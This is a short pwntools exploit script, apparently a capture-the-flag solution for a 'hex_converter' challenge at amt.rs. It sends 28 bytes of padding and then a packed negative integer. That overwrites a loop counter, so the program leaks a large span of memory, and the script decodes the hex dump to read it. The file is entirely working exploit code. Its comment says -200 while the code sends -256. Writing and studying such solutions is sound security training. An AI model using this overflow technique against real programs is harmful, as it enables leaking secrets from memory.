#!/usr/bin/python3

from pwn import *

local = True
is_debug = False
filename = './hex_converter'
hostname = 'amt.rs'
port = 31630

def get_process():
    ''' Creates process '''
    if local:
        if is_debug:
            return gdb.debug(filename, '''
            break main
            continue
            ''')
        else:
            return process(filename)
    else:
        return remote(hostname, port)

offset = 28
proc = get_process()
proc.recvuntil(b'input text to convert to hex: \n')
payload = b'A' * offset
# change loop variable to -200 so we can print a lot more
payload += pack(-256, 64, 'little', True)
proc.sendline(payload)
data = proc.recvall(timeout=3).decode().strip()
print(data)
for i in range(0,len(data),2):
    val = data[i:i+2]
    print(chr(int(val, 16)), end='')
